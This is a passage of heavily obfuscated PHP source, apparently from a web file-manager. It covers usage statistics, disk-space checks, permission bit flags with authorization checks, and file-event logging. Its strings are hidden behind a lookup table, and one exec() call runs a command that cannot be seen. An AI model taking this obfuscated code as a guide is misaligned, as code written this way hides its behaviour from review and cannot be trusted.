$EÜô“óè‰ı = intval($GLOBALS[$eœ›÷¥¡´°[6]][$eœ›÷¥¡´°[347]][$eœ›÷¥¡´°[1488]]) / 3600; $d¿®óùØœ = strtotime("\55{$EÜô“óè‰ı}\x20\150\x6f\165\x72\163"); $FáÿÁˆçﬂº = strtotime(date($eœ›÷¥¡´°[1630])); goto aúúÉïÜ á; D»û¯∑ö≥ƒ: return array($eœ›÷¥¡´°[719] => (int) $cÈáØª»Œ∂, $eœ›÷¥¡´°[1651] => (int) ($cÈáØª»Œ∂ - $aƒÕã™úã∂), $eœ›÷¥¡´°[1652] => (int) $aƒÕã™úã∂, $eœ›÷¥¡´°[1653] => (int) $dÜæ¶≈Ωõ§, $eœ›÷¥¡´°[1654] => $CÕ¨§‡Á¶Ù); goto BúáúÛÔûã; bó£±Éïﬁ°: if (!$CÕ¨§‡Á¶Ù) { $CÕ¨§‡Á¶Ù = 1; } $D÷Ø—ΩÒ∏• = array($eœ›÷¥¡´°[1650] => array($eœ›÷¥¡´°[971], $FáÿÁˆçﬂº)); $dÜæ¶≈Ωõ§ = Model($eœ›÷¥¡´°[506])->where($D÷Ø—ΩÒ∏•)->count($eœ›÷¥¡´°[1528]); goto D»û¯∑ö≥ƒ; BúáúÛÔûã: } private function optionFile() { goto cöÜóΩ‰øë; B⁄å˘œŸ∑ﬁ: $CÃ⁄≤Ï˘Ï  = Model($bîîó≤ëƒ†[790])->where($D≠ç¥øÉñË)->sum($bîîó≤ëƒ†[78]); $FäÒàÕª∏Ü = Model($bîîó≤ëƒ†[790])->where($D≠ç¥øÉñË)->count($bîîó≤ëƒ†[395]); return array($bîîó≤ëƒ†[723] => $Cå¬ıïƒ≤«, $bîîó≤ëƒ†[1623] => $EÈ®ô°“ä¡, $bîîó≤ëƒ†[1655] => $Cå¬ıïƒ≤« - $EÈ®ô°“ä¡, $bîîó≤ëƒ†[1656] => (int) $CÃ⁄≤Ï˘Ï , $bîîó≤ëƒ†[725] => (int) $b¨àΩÊ¬à•, $bîîó≤ëƒ†[1657] => (int) $FäÒàÕª∏Ü); goto DÆ˜Ëï≠Ω; cöÜóΩ‰øë: $bîîó≤ëƒ† =& $_SERVER[ú∫]; $f≤Ωç∂“Çè = $this->sourceSize(); $Cå¬ıïƒ≤« = $f≤Ωç∂“Çè[$bîîó≤ëƒ†[78]]; goto f¡¶¿©Ø–‘; f¡¶¿©Ø–‘: $EÈ®ô°“ä¡ = $f≤Ωç∂“Çè[$bîîó≤ëƒ†[1623]]; $b¨àΩÊ¬à• = Model($bîîó≤ëƒ†[790])->where(array($bîîó≤ëƒ†[403] => 0))->count($bîîó≤ëƒ†[395]); $D≠ç¥øÉñË = array($bîîó≤ëƒ†[403] => 0, $bîîó≤ëƒ†[194] => array($bîîó≤ëƒ†[971], strtotime(date($bîîó≤ëƒ†[1630])))); goto B⁄å˘œŸ∑ﬁ; DÆ˜Ëï≠Ω: } private function optionAccess() { $eÌøùñÔ≠ò =& $_SERVER[ú∫]; return array($eÌøùñÔ≠ò[719] => $this->typeLogCnt(), $eÌøùñÔ≠ò[107] => $this->typeLogCnt($eÌøùñÔ≠ò[107]), $eÌøùñÔ≠ò[430] => $this->typeLogCnt($eÌøùñÔ≠ò[430]), $eÌøùñÔ≠ò[1658] => $this->typeLogCnt($eÌøùñÔ≠ò[1658]), $eÌøùñÔ≠ò[1659] => $this->typeLogCnt($eÌøùñÔ≠ò[1659]), $eÌøùñÔ≠ò[562] => $this->typeLogCnt($eÌøùñÔ≠ò[33], $eÌøùñÔ≠ò[1634])); } private function typeLogCnt($a›Ù¶´¡Ñ≥ = '', $f∂ËΩ¿ŸΩ™ = "\x69\x64") { goto CöˆûˆÁèú; cﬂ€ùõø¨Ç: $AµŸ—¡≈®∆ = array($bäÕ‘ç‹ê∞[194] => array($bäÕ‘ç‹ê∞[971], $d•æåÔÍ¶ª)); if ($a›Ù¶´¡Ñ≥) { $AµŸ—¡≈®∆[$bäÕ‘ç‹ê∞[29]] = array($bäÕ‘ç‹ê∞[7], $eèå˘—ƒ´ƒ[$a›Ù¶´¡Ñ≥]); } $A∂ºÚ»È∫Ñ = Model($bäÕ‘ç‹ê∞[1633])->where($AµŸ—¡≈®∆)->count($f∂ËΩ¿ŸΩ™); goto FΩÁº–û†Ü; FΩÁº–û†Ü: return (int) $A∂ºÚ»È∫Ñ; goto aôë˘¡ê¡∞; CöˆûˆÁèú: $bäÕ‘ç‹ê∞ =& $_SERVER[ú∫]; $eèå˘—ƒ´ƒ = array($bäÕ‘ç‹ê∞[107] => array($bäÕ‘ç‹ê∞[1660], $bäÕ‘ç‹ê∞[1661]), $bäÕ‘ç‹ê∞[430] => array($bäÕ‘ç‹ê∞[1662], $bäÕ‘ç‹ê∞[1663]), $bäÕ‘ç‹ê∞[1658] => array($bäÕ‘ç‹ê∞[1664], $bäÕ‘ç‹ê∞[1665], $bäÕ‘ç‹ê∞[1666]), $bäÕ‘ç‹ê∞[1659] => array($bäÕ‘ç‹ê∞[1667], $bäÕ‘ç‹ê∞[1668]), $bäÕ‘ç‹ê∞[1669] => array($bäÕ‘ç‹ê∞[1670], $bäÕ‘ç‹ê∞[1671], $bäÕ‘ç‹ê∞[1672])); $d•æåÔÍ¶ª = strtotime(date($bäÕ‘ç‹ê∞[1630])); goto cﬂ€ùõø¨Ç; aôë˘¡ê¡∞: } private function optionServer() { goto EßëÉ’Ø•◊; EßëÉ’Ø•◊: $BìÇ–√¨êö =& $_SERVER[ú∫]; $e¥ÉﬂÑõû˘ = $this->diskDriver(); $eœÚå∑◊ƒÔ = KodIO::defaultDriver(); goto E≈∫á–é‘¿; cÆå£„üïì: if ($bÑî∆Üê§ÿ == $BìÇ–√¨êö[755]) { $a—„òÊãœî = explode($BìÇ–√¨êö[1167], $DÉ€éãÒó‹[$BìÇ–√¨êö[931]]); $bÑî∆Üê§ÿ = $a—„òÊãœî[0]; } if ($bÑî∆Üê§ÿ == $BìÇ–√¨êö[758] || $bÑî∆Üê§ÿ == $BìÇ–√¨êö[759]) { $DÚÀåÜ«»Ÿ = Model()->db()->query($BìÇ–√¨êö[1673]); $Eì¶ ⁄êÃ∞ = $DÚÀåÜ«»Ÿ[0] && isset($DÚÀåÜ«»Ÿ[0][$BìÇ–√¨êö[1431]]) ? $DÚÀåÜ«»Ÿ[0][$BìÇ–√¨êö[1431]] : 0; $bÑî∆Üê§ÿ = $BìÇ–√¨êö[1674] . ($Eì¶ ⁄êÃ∞ ? $BìÇ–√¨êö[8] . $Eì¶ ⁄êÃ∞ : $BìÇ–√¨êö[33]); } $A‚ø¶êÓ‚√ = $GLOBALS[$BìÇ–√¨êö[6]][$BìÇ–√¨êö[347]][$BìÇ–√¨êö[792]]; goto EØû⁄ò∞•Ê; EØû⁄ò∞•Ê: return array($BìÇ–√¨êö[1675] => $e¥ÉﬂÑõû˘ ? $e¥ÉﬂÑõû˘[$BìÇ–√¨êö[1676]] : 0, $BìÇ–√¨êö[1677] => $e¥ÉﬂÑõû˘ ? $e¥ÉﬂÑõû˘[$BìÇ–√¨êö[1678]] : 0, $BìÇ–√¨êö[1679] => (int) $eœÚå∑◊ƒÔ[$BìÇ–√¨êö[1676]] * 1024 * 1024 * 1024, $BìÇ–√¨êö[1680] => (int) $a†¥‚Ê¶ˆ€, $BìÇ–√¨êö[1681] => ucfirst($dÍÖ±Ã¶Öò), $BìÇ–√¨êö[1682] => $BìÇ–√¨êö[1683] . PHP_VERSION, $BìÇ–√¨êö[1684] => phpBuild64() ? 64 : 32, $BìÇ–√¨êö[718] => str_replace($BìÇ–√¨êö[1685], $BìÇ–√¨êö[948], $bÑî∆Üê§ÿ), $BìÇ–√¨êö[347] => ucfirst($A‚ø¶êÓ‚√), $BìÇ–√¨êö[28] => $_SERVER[$BìÇ–√¨êö[1686]]); goto fØıºÌ∑—ê; c≠ﬂ€ÓÇ©‰: $dÍÖ±Ã¶Öò = $E˜©£œÓûÖ[0]; $DÉ€éãÒó‹ = $GLOBALS[$BìÇ–√¨êö[6]][$BìÇ–√¨êö[17]]; $bÑî∆Üê§ÿ = $DÉ€éãÒó‹[$BìÇ–√¨êö[932]]; goto cÆå£„üïì; E≈∫á–é‘¿: $b°›øüΩ†Ì = array($BìÇ–√¨êö[782] => $eœÚå∑◊ƒÔ[$BìÇ–√¨êö[393]]); $a†¥‚Ê¶ˆ€ = Model($BìÇ–√¨êö[450])->where($b°›øüΩ†Ì)->sum($BìÇ–√¨êö[78]); $E˜©£œÓûÖ = explode($BìÇ–√¨êö[50], $_SERVER[$BìÇ–√¨êö[142]]); goto c≠ﬂ€ÓÇ©‰; fØıºÌ∑—ê: } private function diskDriver() { goto Aµ≤ÂìÖ⁄ú; Aµ≤ÂìÖ⁄ú: $CáçÃµ∑ÿ¶ =& $_SERVER[ú∫]; $A‘ØÀÆçïœ = $CáçÃµ∑ÿ¶[8]; $añ§…∑ªÌ≤ = $GLOBALS[$CáçÃµ∑ÿ¶[6]][$CáçÃµ∑ÿ¶[1687]] == $CáçÃµ∑ÿ¶[1688]; goto e÷áïÜü√π; dæ≤Ïôµ›‰: $bπ÷ÕÕ“é∫ = $b–∆ıÕº∏€ - @disk_free_space($A‘ØÀÆçïœ); return array($CáçÃµ∑ÿ¶[1676] => $b–∆ıÕº∏€, $CáçÃµ∑ÿ¶[1678] => $bπ÷ÕÕ“é∫); goto CÚ™æ¡√Óò; e÷áïÜü√π: if ($añ§…∑ªÌ≤) { $A‘ØÀÆçïœ = $CáçÃµ∑ÿ¶[1689]; if (function_exists($CáçÃµ∑ÿ¶[1690])) { exec($CáçÃµ∑ÿ¶[1691], $Aö¨‰ïÇÉà); $A‘ØÀÆçïœ = $Aö¨‰ïÇÉà[1] . $CáçÃµ∑ÿ¶[8]; } } if (!file_exists($A‘ØÀÆçïœ)) { return; } $b–∆ıÕº∏€ = @disk_total_space($A‘ØÀÆçïœ); goto dæ≤Ïôµ›‰; CÚ™æ¡√Óò: } public function fileChart($A∆Ÿ¯„·ƒ) { goto c°†˘‚≈ãı; c°†˘‚≈ãı: $CΩ¶¥Èòöé =& $_SERVER[ú∫]; if (isset($A∆Ÿ¯„·ƒ[$CΩ¶¥Èòöé[1528]])) { return Model($CΩ¶¥Èòöé[790])->userFileTypeProfile($A∆Ÿ¯„·ƒ[$CΩ¶¥Èòöé[1528]]); } if (isset($A∆Ÿ¯„·ƒ[$CΩ¶¥Èòöé[1692]])) { return Model($CΩ¶¥Èòöé[790])->groupFileTypeProfile($A∆Ÿ¯„·ƒ[$CΩ¶¥Èòöé[1692]]); } goto Aù’¬¢ﬂœà; Fã˜Ê„Œ‘‘: $fü≈ΩËΩÈ¡[$CΩ¶¥Èòöé[404]] = 2; $d¨„Ìì›”© = Model($CΩ¶¥Èòöé[790])->where($fü≈ΩËΩÈ¡)->sum($CΩ¶¥Èòöé[78]); return array($CΩ¶¥Èòöé[723] => $Fµ‹Úáü≈±[$CΩ¶¥Èòöé[78]], $CΩ¶¥Èòöé[1623] => $Fµ‹Úáü≈±[$CΩ¶¥Èòöé[1623]], $CΩ¶¥Èòöé[1624] => (int) $EÔéﬁá¬à‚, $CΩ¶¥Èòöé[1625] => (int) $d¨„Ìì›”©); goto B±ﬁ’òù©Ö; Aù’¬¢ﬂœà: $Fµ‹Úáü≈± = $this->sourceSize(); $fü≈ΩËΩÈ¡ = array($CΩ¶¥Èòöé[478] => 0, $CΩ¶¥Èòöé[404] => 1); $EÔéﬁá¬à‚ = Model($CΩ¶¥Èòöé[790])->where($fü≈ΩËΩÈ¡)->sum($CΩ¶¥Èòöé[78]); goto Fã˜Ê„Œ‘‘; B±ﬁ’òù©Ö: } private function sourceSize() { $cîÊ£Î›ô’ =& $_SERVER[ú∫]; $EèñÂº∏¯â = Model($cîÊ£Î›ô’[790])->where(array($cîÊ£Î›ô’[403] => 0))->sum($cîÊ£Î›ô’[78]); $a∆‡ÂäÕ”ª = Model($cîÊ£Î›ô’[450])->sum($cîÊ£Î›ô’[78]); if ($a∆‡ÂäÕ”ª > $EèñÂº∏¯â) { $a∆‡ÂäÕ”ª = $EèñÂº∏¯â; } return array($cîÊ£Î›ô’[78] => (int) $EèñÂº∏¯â, $cîÊ£Î›ô’[1623] => (int) $a∆‡ÂäÕ”ª); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $CÎñó‡¶ùŸ =& $_SERVER[ú∫]; $Cﬁ”Ú∂ã•ï = array(array($CÎñó‡¶ùŸ[413] => LNG($CÎñó‡¶ùŸ[1693]), $CÎñó‡¶ùŸ[1694] => $CÎñó‡¶ùŸ[1695], $CÎñó‡¶ùŸ[1696] => 1, $CÎñó‡¶ùŸ[1697] => 1, $CÎñó‡¶ùŸ[1698] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($CÎñó‡¶ùŸ[413] => LNG($CÎñó‡¶ùŸ[1699]), $CÎñó‡¶ùŸ[1694] => $CÎñó‡¶ùŸ[1700], $CÎñó‡¶ùŸ[1696] => 2, $CÎñó‡¶ùŸ[1697] => 1, $CÎñó‡¶ùŸ[1698] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($CÎñó‡¶ùŸ[413] => LNG($CÎñó‡¶ùŸ[1701]), $CÎñó‡¶ùŸ[1694] => $CÎñó‡¶ùŸ[1702], $CÎñó‡¶ùŸ[1696] => 3, $CÎñó‡¶ùŸ[1697] => 1, $CÎñó‡¶ùŸ[1698] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($CÎñó‡¶ùŸ[413] => LNG($CÎñó‡¶ùŸ[1703]), $CÎñó‡¶ùŸ[1694] => $CÎñó‡¶ùŸ[1704], $CÎñó‡¶ùŸ[1696] => 4, $CÎñó‡¶ùŸ[1697] => 1, $CÎñó‡¶ùŸ[1698] => self::AUTH_SHOW | self::AUTH_VIEW), array($CÎñó‡¶ùŸ[413] => LNG($CÎñó‡¶ùŸ[1705]), $CÎñó‡¶ùŸ[1694] => $CÎñó‡¶ùŸ[1706], $CÎñó‡¶ùŸ[1696] => 5, $CÎñó‡¶ùŸ[1697] => 1, $CÎñó‡¶ùŸ[1698] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($CÎñó‡¶ùŸ[413] => LNG($CÎñó‡¶ùŸ[1707]), $CÎñó‡¶ùŸ[1694] => $CÎñó‡¶ùŸ[1708], $CÎñó‡¶ùŸ[1696] => 6, $CÎñó‡¶ùŸ[1697] => 1, $CÎñó‡¶ùŸ[1698] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($CÎñó‡¶ùŸ[413] => LNG($CÎñó‡¶ùŸ[1709]), $CÎñó‡¶ùŸ[1694] => $CÎñó‡¶ùŸ[1710], $CÎñó‡¶ùŸ[1696] => 7, $CÎñó‡¶ùŸ[1697] => 1, $CÎñó‡¶ùŸ[1698] => 0)); return $Cﬁ”Ú∂ã•ï; } public static function authCheck($f¢Üñ¬¬•, $bÂ€éãúÂ⁄) { $f¢Üñ¬¬• = intval($f¢Üñ¬¬•); if ($GLOBALS[$_SERVER[ú∫][485]]) { return !0; } if ($f¢Üñ¬¬• <= 0) { return !1; } if (($f¢Üñ¬¬• & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($f¢Üñ¬¬• & $bÂ€éãúÂ⁄); } public static function authCheckShow($bñÔé∂’Ω“) { return self::authCheck($bñÔé∂’Ω“, self::AUTH_SHOW); } public static function authCheckView($E˜Òä›É∏ﬂ) { return self::authCheck($E˜Òä›É∏ﬂ, self::AUTH_VIEW); } public static function authCheckDownload($EãÖÇ‘™„©) { return self::authCheck($EãÖÇ‘™„©, self::AUTH_DOWNLOAD); } public static function authCheckUpload($Dëèﬁ„ûû«) { return self::authCheck($Dëèﬁ„ûû«, self::AUTH_UPLOAD); } public static function authCheckEdit($FÉëÜÖ›∂Œ) { return self::authCheck($FÉëÜÖ›∂Œ, self::AUTH_EDIT); } public static function authCheckRemove($D˘ƒ¢Ø“∑÷) { return self::authCheck($D˘ƒ¢Ø“∑÷, self::AUTH_REMOVE); } public static function authCheckShare($cÉ≈è§∂™∆) { return self::authCheck($cÉ≈è§∂™∆, self::AUTH_SHARE); } public static function authCheckComment($EÜ´„ÈÚ•‹) { return self::authCheck($EÜ´„ÈÚ•‹, self::AUTH_COMMENT); } public static function authCheckEvent($A≈îÖ¨∫™ß) { return self::authCheck($A≈îÖ¨∫™ß, self::AUTH_EVENT); } public static function authCheckRoot($C˜ó◊ÓúÌ) { return self::authCheck($C˜ó◊ÓúÌ, self::AUTH_ROOT); } public static function authCheckAction($CûÑÃÊ‰î›, $d‰ŒçîÆΩ◊) { goto BèùÖÛëÖƒ; DÔ®Üó·˜õ: $BÉÑ‡Œå¬å = $F…ü”ÙÛå…[$d‰ŒçîÆΩ◊]; $CûÑÃÊ‰î› = intval($CûÑÃÊ‰î›); if ($CûÑÃÊ‰î› <= 0) { return !1; } goto dœ“π‹¶ÚÕ; BèùÖÛëÖƒ: $dâ⁄óˆ¢úô =& $_SERVER[ú∫]; $F…ü”ÙÛå… = array($dâ⁄óˆ¢úô[1711] => self::AUTH_VIEW, $dâ⁄óˆ¢úô[1094] => self::AUTH_DOWNLOAD, $dâ⁄óˆ¢úô[107] => self::AUTH_UPLOAD, $dâ⁄óˆ¢úô[1659] => self::AUTH_EDIT, $dâ⁄óˆ¢úô[1658] => self::AUTH_REMOVE, $dâ⁄óˆ¢úô[1669] => self::AUTH_SHARE, $dâ⁄óˆ¢úô[352] => self::AUTH_COMMENT, $dâ⁄óˆ¢úô[1517] => self::AUTH_EVENT, $dâ⁄óˆ¢úô[1712] => self::AUTH_ROOT); if (!isset($F…ü”ÙÛå…[$d‰ŒçîÆΩ◊])) { return; } goto DÔ®Üó·˜õ; dœ“π‹¶ÚÕ: if (($CûÑÃÊ‰î› & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($CûÑÃÊ‰î› & $BÉÑ‡Œå¬å); goto CØÆÒ´Øúü; CØÆÒ´Øúü: } public static function authDisable($CºÈºâ£Ó, $cØÂ»Ö£áË) { if (intval($CºÈºâ£Ó) <= 0) { return 0; } return intval($CºÈºâ£Ó) & ~$cØÂ»Ö£áË; } public $optionType = "\x53\171\x73\x74\145\x6d\56\x73\x6f\165\x72\x63\x65\101\165\x74\x68\114\151\163\x74"; public $field = array("\x6e\141\x6d\145", "\141\165\x74\150", "\x6c\141\142\145\x6c", "\144\151\163\160\154\141\x79", "\x73\171\163\x74\x65\155", "\163\157\162\x74"); public function initData() { $cÌÓé˘ﬁÓö = $this->authDefault(); foreach ($cÌÓé˘ﬁÓö as $F¥äì¶Î¢Í) { $this->add($F¥äì¶Î¢Í); } } public function listData($b¶–⁄éÜùŸ = false, $AÒ‘««ç‰´ = "\x73\x6f\162\x74", $E∑îπ™«¬π = false) { return parent::listData($b¶–⁄éÜùŸ, $AÒ‘««ç‰´, $E∑îπ™«¬π); } public function update($AÛ™ªàﬁÈÓ, $B–áΩÕ∞—É) { $fêêõßÖ’¯ =& $_SERVER[ú∫]; $c î¡ô≠ÌÛ = parent::listData($AÛ™ªàﬁÈÓ); $fªç≥‡Ò¶» = $this->findByName($B–áΩÕ∞—É[$fêêõßÖ’¯[28]]); if (!$c î¡ô≠ÌÛ || $fªç≥‡Ò¶» && $fªç≥‡Ò¶»[$fêêõßÖ’¯[393]] != $c î¡ô≠ÌÛ[$fêêõßÖ’¯[393]]) { return !1; } $this->filterAuth($B–áΩÕ∞—É[$fêêõßÖ’¯[406]]); return parent::update($AÛ™ªàﬁÈÓ, $B–áΩÕ∞—É); } public function remove($DµÚ”“€Ëß) { $A„Íù√ÒÿË = parent::listData($DµÚ”“€Ëß); if (!$A„Íù√ÒÿË || $A„Íù√ÒÿË[$_SERVER[ú∫][1171]]) { return !1; } return parent::remove($DµÚ”“€Ëß); } public function add($B…ÚéáëÑ» = array()) { goto b¨öã“Ïç≈; Eîäûè´ Û: return parent::insert($B…ÚéáëÑ»); goto FÒœ‚œ≠‹å; b¨öã“Ïç≈: $Bêı∏çˆø» =& $_SERVER[ú∫]; if ($this->findByName($B…ÚéáëÑ»[$Bêı∏çˆø»[28]])) { return !1; } $eÂ„◊“íí  = array($Bêı∏çˆø»[28] => $Bêı∏çˆø»[33], $Bêı∏çˆø»[406] => 1, $Bêı∏çˆø»[1713] => $Bêı∏çˆø»[1702], $Bêı∏çˆø»[1714] => 1, $Bêı∏çˆø»[1171] => 0, $Bêı∏çˆø»[1715] => 0); goto EÀËí≤¥´¡; EÀËí≤¥´¡: $B…ÚéáëÑ» = array_merge($eÂ„◊“íí , $B…ÚéáëÑ»); $B…ÚéáëÑ»[$Bêı∏çˆø»[1715]] = $this->getSort(); $this->filterAuth($B…ÚéáëÑ»[$Bêı∏çˆø»[406]]); goto Eîäûè´ Û; FÒœ‚œ≠‹å: } private function getSort() { $eî£ß®ÇÜó =& $_SERVER[ú∫]; $cÇ÷È¬çß√ = parent::listData(); $bﬁôﬂ¡ÜÎÛ = array_to_keyvalue($cÇ÷È¬çß√, $eî£ß®ÇÜó[33], $eî£ß®ÇÜó[1715]); return empty($bﬁôﬂ¡ÜÎÛ) ? 0 : max($bﬁôﬂ¡ÜÎÛ) + 1; } private function filterAuth(&$AÛãË›≈°◊) { goto fö©ﬁûé•Ì; fö©ﬁûé•Ì: if (!$AÛãË›≈°◊) { return; } $déÚÈå∫âÔ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $e√üµ©åÍ≤ = array(); goto C¿ˆ´Î°„È; bÍºØ≈§∞°: foreach ($e√üµ©åÍ≤ as $AﬂÃπÃÌÂØ) { if (isset($Aé‹œåûÜË[$AﬂÃπÃÌÂØ])) { $e√üµ©åÍ≤ = array_merge($e√üµ©åÍ≤, $Aé‹œåûÜË[$AﬂÃπÃÌÂØ]); } } $e√üµ©åÍ≤[] = self::AUTH_SHOW; $AÛãË›≈°◊ = array_sum(array_unique($e√üµ©åÍ≤)); goto B¬»òªº‘Á; C¿ˆ´Î°„È: foreach ($déÚÈå∫âÔ as $AﬂÃπÃÌÂØ) { if ($AÛãË›≈°◊ & $AﬂÃπÃÌÂØ) { $e√üµ©åÍ≤[] = $AﬂÃπÃÌÂØ; } } if (in_array(self::AUTH_ROOT, $e√üµ©åÍ≤)) { $AÛãË›≈°◊ = array_sum($déÚÈå∫âÔ); return; } $Aé‹œåûÜË = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto bÍºØ≈§∞°; B¬»òªº‘Á: } public function sort($dê£üÒÈ‰ù, $B≈ôãâÍÛÈ) { return parent::update($dê£üÒÈ‰ù, $B≈ôãâÍÛÈ); } } goto DéÑ“Ù‘Á‡; C¿πúØ†≠É: class SourceEventModel extends ModelBase { protected $tableName = "\x69\x6f\137\163\x6f\165\162\143\145\x5f\145\x76\x65\x6e\x74"; protected $dataAuto = array(array("\x63\162\x65\x61\164\x65\x54\151\155\145", "\164\x69\x6d\145", "\151\156\163\x65\x72\x74", "\x66\x75\156\x63\x74\x69\157\x6e"), array("\x64\x65\163\x63", '', "\x69\x6e\x73\145\x72\164\x2c\x75\160\x64\x61\164\x65\x2c\163\x65\x6c\x65\143\164", "\x6a\163\157\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($e∏æ‘…®œ , $D‚Áåá€ËÙ, $Cµ·æÒıç = '') { goto b∏µ¥”¿€å; fñÒàå¢Ø∆: if (!$Còßªõ·÷∫) { return !1; } if ($this->isCacheEvent($Còßªõ·÷∫, $D‚Áåá€ËÙ)) { return; } if ($Cµ·æÒıç && is_string($Cµ·æÒıç)) { $Cµ·æÒıç = array($aîÇï´…å∆[1725] => $Cµ·æÒıç); } goto dæÔË÷ñ´É; dæÔË÷ñ´É: $D…ºﬁÆ√Ïõ = array($aîÇï´…å∆[410] => $e∏æ‘…®œ , $aîÇï´…å∆[1900] => $Còßªõ·÷∫[$aîÇï´…å∆[478]], $aîÇï´…å∆[1901] => $Còßªõ·÷∫[$aîÇï´…å∆[28]], $aîÇï´…å∆[495] => !empty($Còßªõ·÷∫[$aîÇï´…å∆[495]]) ? $Còßªõ·÷∫[$aîÇï´…å∆[495]] : $aîÇï´…å∆[33], $aîÇï´…å∆[1520] => USER_ID, $aîÇï´…å∆[415] => $D‚Áåá€ËÙ, $aîÇï´…å∆[1522] => $Cµ·æÒıç); $this->addSystemLog($D‚Áåá€ËÙ, $D…ºﬁÆ√Ïõ); unset($D…ºﬁÆ√Ïõ[$aîÇï´…å∆[1901]], $D…ºﬁÆ√Ïõ[$aîÇï´…å∆[495]]); goto C‘π€ç…ë; C‘π€ç…ë: return $this->add($D…ºﬁÆ√Ïõ); goto bÉôÊË≈ô·; b∏µ¥”¿€å: $aîÇï´…å∆ =& $_SERVER[ú∫]; if (!$this->eventSave) { return; } $Còßªõ·÷∫ = Model($aîÇï´…å∆[1206])->sourceInfo($e∏æ‘…®œ ); goto fñÒàå¢Ø∆; bÉôÊË≈ô·: } private function addSystemLog($FﬂÇ⁄¶ªÌÏ, $C⁄≠õÊëƒÒ) { $cƒá’´ç›ê =& $_SERVER[ú∫]; if ($FﬂÇ⁄¶ªÌÏ == $cƒá’´ç›ê[1902]) { $FﬂÇ⁄¶ªÌÏ = $C⁄≠õÊëƒÒ[$cƒá’´ç›ê[431]][$cƒá’´ç›ê[1903]]; } else { if (in_array($FﬂÇ⁄¶ªÌÏ, array($cƒá’´ç›ê[1669], $cƒá’´ç›ê[1904]))) { $FﬂÇ⁄¶ªÌÏ = $C⁄≠õÊëƒÒ[$cƒá’´ç›ê[431]][$cƒá’´ç›ê[715]]; } } $d“ÆÉØéíÉ = array_merge($C⁄≠õÊëƒÒ, array($cƒá’´ç›ê[1905] => $C⁄≠õÊëƒÒ[$cƒá’´ç›ê[395]], $cƒá’´ç›ê[1906] => $C⁄≠õÊëƒÒ[$cƒá’´ç›ê[1906]])); Model($cƒá’´ç›ê[1633])->addLog($cƒá’´ç›ê[1907] . $FﬂÇ⁄¶ªÌÏ, $d“ÆÉØéíÉ); } private function isCacheEvent($Fá πÈôöº, $AíƒÔ≥øÌ◊) { if ($Fá πÈôöº[$_SERVER[ú∫][404]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($c–®—úˆ™œ, $E≈√¢à§Æ¥) { $Fóùˆñ»Öî =& $_SERVER[ú∫]; $AÛÁˆ·ÿπµ = Model($Fóùˆñ»Öî[1206])->sourceInfo($c–®—úˆ™œ); $F∆„˜›£Ø£ = array($Fóùˆñ»Öî[1903] => $E≈√¢à§Æ¥, $Fóùˆñ»Öî[28] => $AÛÁˆ·ÿπµ[$Fóùˆñ»Öî[28]]); return $this->addEvent($c–®—úˆ™œ, $Fóùˆñ»Öî[1902], $F∆„˜›£Ø£); } public function eventFileEdit($bû±Â“¨Çœ) { $A©’»©‰—◊ =& $_SERVER[ú∫]; $bìø∂‰ﬂ–· = array($A©’»©‰—◊[1908] => $_SERVER[$A©’»©‰—◊[1909]], $A©’»©‰—◊[1910] => strtolower(ACTION)); return $this->addEvent($bû±Â“¨Çœ, $A©’»©‰—◊[1659], $bìø∂‰ﬂ–·); } public function eventRecycle($EÏûÉ°ò‹ﬂ, $d•’è‚à›æ) { return $this->addEvent($EÏûÉ°ò‹ﬂ, $_SERVER[ú∫][1904], $d•’è‚à›æ); } public function eventRemove($EΩ«éÜ±†É) { $A™åÂ„é´É =& $_SERVER[ú∫]; $bî§ß™¥ë€ = Model($A™åÂ„é´É[1206])->sourceInfo($EΩ«éÜ±†É); $bøÂÇäæ»ã = $bî§ß™¥ë€[$A™åÂ„é´É[28]]; return $this->addEvent($bî§ß™¥ë€[$A™åÂ„é´É[478]], $A™åÂ„é´É[1658], $bøÂÇäæ»ã); } public function eventShare($F¯ôŒ⁄óÆö, $aÖ•Ã»ÓÂõ) { return $this->addEvent($F¯ôŒ⁄óÆö, $_SERVER[ú∫][1669], $aÖ•Ã»ÓÂõ); } public function eventMove($EÌª†ïäÀˆ, $EØê®õ∆•ﬂ, $DÚ∞ÙóÔ¯Ë) { goto cÏÖÔèîûÎ; CÂπ∞±Ôï†: 